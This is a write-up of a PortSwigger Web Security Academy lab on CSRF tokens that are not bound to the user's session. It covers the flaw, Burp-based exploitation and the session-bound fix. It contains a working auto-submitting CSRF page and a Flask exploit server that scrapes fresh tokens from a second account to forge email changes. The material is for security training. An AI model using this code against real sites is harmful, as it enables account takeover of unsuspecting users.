# CSRF: Token Not Tied to User Session

**Lab:** PortSwigger Web Security Academy — *CSRF where token is not tied to user session*
**Category:** Cross-Site Request Forgery (CSRF), token validation flaws
**Difficulty:** Practitioner

---

## 1. What the lab does

The application has an "Update email" feature on `/my-account`. To prevent CSRF,
every request to change the email includes a `csrf` token, generated server-side
and rendered as a hidden form field:

```html
<form action="/my-account/change-email" method="POST">
  <input type="hidden" name="csrf" value="a1b2c3...">
  <input required type="email" name="email" value="wiener@normal-user.net">
  <button class="button" type="submit">Update email</button>
</form>
```

On the surface this looks like a correctly defended app — no token, no request.
The flaw is *how* the server checks the token.

## 2. The vulnerability

A correctly implemented anti-CSRF token is bound to the session that requested
it. The server should check: **"is this token valid, *and* was it issued to
the session making this request?"**

This app only checks the first half. Internally, it behaves like:

```python
if token in valid_csrf_tokens:      # checked
    ...                             # but never: token belongs to THIS session
```

That means **any valid, unused token — issued to any account — will be
accepted on any other account's request**, as long as the request also
carries a valid session cookie for the account being modified.

This is exactly what our local simulation (`app.py`, built earlier for
practice) reproduces with its `valid_csrf_tokens` set: a single global pool,
with no mapping back to a specific `session_id`.

### Why this is exploitable

An attacker can:

1. Get *any* valid token — trivially, by logging into their **own** account
   and loading the account page (or submitting the form once) to have one
   issued.
2. Build a forged HTML page that POSTs to `/my-account/change-email` with
   that token and an attacker-controlled email address.
3. Get the victim's browser to submit that form. Because the victim is
   already logged in, their session cookie is attached automatically. The
   server sees "valid session + valid token" and accepts it — never
   noticing the token wasn't actually issued to *that* session.

This is the classic CSRF pattern (forged cross-origin request riding on the
victim's ambient session cookie), with the added twist that the "defense"
token gives a false sense of security because it *looks* present and
well-formed.

## 3. Manual exploitation (Burp-based, per the lab's intended solution)

1. In Burp's browser, log in as `wiener:peter`. Submit "Update email" and
   intercept the request in Burp Proxy.
2. Note the `csrf` value on that request, then drop it (don't let it reach
   the server, since tokens are single-use and we don't want to consume it
   yet).
3. In a private/incognito window, log in as `carlos:montoya`, submit "Update
   email", and send that request to Burp Repeater instead.
4. In Repeater, swap `carlos`'s token for `wiener`'s captured token (or vice
   versa) and resend. It succeeds — proving the token isn't checked against
   the session.
5. Build a hosted HTML PoC that auto-submits a forged request, including a
   **fresh** (unused) token, since tokens are single-use.
6. Set the target `email` field to something that isn't the victim's own
   address.
7. Store the exploit on the exploit server and click **Deliver to victim**.
   PortSwigger's simulated victim browser (logged in as wiener) visits the
   page, the forged request fires, and the lab is marked solved.

## 4. The PoC page

```html
<html>
  <body>
    <h3>Loading, please wait...</h3>
    <form id="csrf-form"
          action="https://LAB_ORIGIN/my-account/change-email"
          method="POST">
      <input type="hidden" name="email" value="hacker@evil-user.net">
      <input type="hidden" name="csrf" value="TOKEN_GOES_HERE">
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>
```

- `action` points at the **real lab's** change-email endpoint — the exploit
  doesn't need to be hosted on the same origin; that's the whole point of
  CSRF (the browser attaches the victim's cookie regardless of where the
  request was *initiated* from).
- The `<script>` block auto-submits the form the instant the page loads, so
  the victim doesn't need to click anything.
- The token has to be **fresh** — it's consumed the moment it's used, so a
  token captured five minutes ago will already be invalid by delivery time.

That last point is what motivated automating token retrieval instead of
hardcoding one.

## 5. Automating token retrieval — `exploit_server.py`

Manually copying a token in, hoping it's still valid by the time you click
"Deliver to victim," is fragile. `exploit_server.py` removes that race
condition by fetching a **brand-new token at the moment the exploit page is
requested**, rather than at the moment you *wrote* the exploit.

### 5.1 High-level flow

```
victim's browser  ──GET──▶  exploit_server.py (Flask, local)
                                   │
                                   ▼
                        logs into the LAB as carlos
                        (fresh session, via `requests`)
                                   │
                                   ▼
                     scrapes a live csrf token from
                     carlos's /my-account page
                                   │
                                   ▼
                  renders exploit HTML with that token
                  baked into the hidden `csrf` field
                                   │
                                   ▼
victim's browser  ◀──HTML response──
       │
       ▼
 auto-submits form to the LAB's
 /my-account/change-email, using
 the VICTIM's own session cookie
```

The key insight: the token is scraped using **carlos's** session (via Python's
`requests` library, server-side, invisible to the victim), but the *form
that actually gets submitted* rides on the **victim's** session cookie,
because it's the victim's browser doing the submitting. The token and the
session it rides on belong to two different accounts — which is exactly the
bug being exploited.

### 5.2 `get_fresh_token()` — step by step

```python
def get_fresh_token(max_retries=5, delay=1.5):
    for attempt in range(1, max_retries + 1):
        try:
            session = requests.Session()

            # 1. GET the login page - it has its own csrf field
            login_page = session.get(f"{LAB_ORIGIN}/login", timeout=10)
            login_match = CSRF_RE.search(login_page.text)
            login_csrf = login_match.group(1)

            # 2. Log in as carlos
            session.post(f"{LAB_ORIGIN}/login", data={
                "username": CARLOS_USER,
                "password": CARLOS_PASS,
                "csrf": login_csrf,
            })

            # 3. GET the account page and grab the change-email token
            account_page = session.get(f"{LAB_ORIGIN}/my-account")
            token_match = CSRF_RE.search(account_page.text)
            return token_match.group(1)

        except Exception as e:
            time.sleep(delay)   # retry on any failure
    raise RuntimeError("could not obtain a fresh token")
```

- **A `requests.Session()` per attempt** keeps cookies (the login session
  cookie) scoped to that one login flow — no cross-contamination between
  retries.
- **The login page itself has a CSRF token** (separate from the
  email-change one) — the script has to solve that first, or the login POST
  itself gets rejected.
- **`CSRF_RE`** is a simple regex (`name="csrf"\s+value="([^"]+)"`) rather
  than a full HTML parser, because the token field's markup is small and
  predictable. A more robust version could use `BeautifulSoup` if the
  markup ever gets more complex.
- **Retry loop**: any exception — network timeout, unexpected HTML, a login
  failure — triggers a short sleep and another attempt, up to 5 times. This
  is what makes the "keeps changing" problem a non-issue: instead of trying
  to catch a moving target, the script just re-fetches until it succeeds.

### 5.3 Serving the exploit

```python
@app.route("/exploit.html")
def exploit():
    token = get_fresh_token()
    html = EXPLOIT_TEMPLATE.format(
        lab_origin=LAB_ORIGIN,
        target_email=TARGET_EMAIL,
        token=token,
    )
    return Response(html, mimetype="text/html")
```

Every time this route is hit, it re-runs the whole login-and-scrape flow —
so the token embedded in the HTML is *always* as fresh as possible relative
to when the victim's browser requests the page. This is the same reason the
real lab's advice to "include a fresh token" matters: the token isn't
being generated once and hoped to survive; it's generated on demand.

### 5.4 Where this fits vs. the lab's own exploit server

Running `exploit_server.py` locally and visiting it in your own browser
**proves the vulnerability end-to-end** — it genuinely changes the victim
account's email via a forged cross-origin request. What it does *not* do is
flip the lab's "solved" flag, because that only happens when PortSwigger's
own simulated victim browser is driven to the **hosted exploit server's**
stored page via "Deliver to victim." So in practice:

- Use `exploit_server.py` (or `curl`-ing its `/exploit.html` route) purely to
  **generate a fresh token on demand**.
- Copy that token into the PoC stored on PortSwigger's own exploit server.
- Click "Deliver to victim" there to actually complete the lab.

## 6. Root cause and fix

The underlying bug is a missing binding between token and session. A correct
implementation stores tokens keyed by session (or embeds the session ID
inside a signed token) and checks both:

```python
# Fixed version (conceptual)
if session_tokens.get(session_id) != submitted_token:
    reject()
```

or, more robustly, a synchronizer token pattern where the token itself is
cryptographically derived from the session ID (e.g. HMAC(session_id, secret))
so it can be verified without server-side storage at all, and a token from
one session can never validate against another.

## 7. Key takeaways

- A CSRF token being present, well-formed, and single-use is **not**
  sufficient — it must also be cryptographically bound to the session using
  it.
- CSRF doesn't require the attacker to know any secret belonging to the
  victim; it just needs the victim's browser to make a request the attacker
  crafted, and relies on cookies being sent automatically.
- Automating "get a valid artifact, then use it against a different
  identity" is a useful general pattern for practicing timing-sensitive
  vulnerabilities (single-use tokens, short-lived nonces, race conditions),
  not just this specific lab.